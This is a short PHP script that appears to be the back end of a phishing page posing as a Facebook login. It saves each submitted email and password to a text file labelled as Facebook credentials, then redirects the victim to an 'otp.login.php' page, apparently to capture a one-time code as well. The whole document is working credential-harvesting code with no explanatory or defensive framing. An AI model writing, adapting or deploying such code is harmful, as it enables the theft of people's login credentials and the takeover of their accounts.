<?php
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\n". "Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>
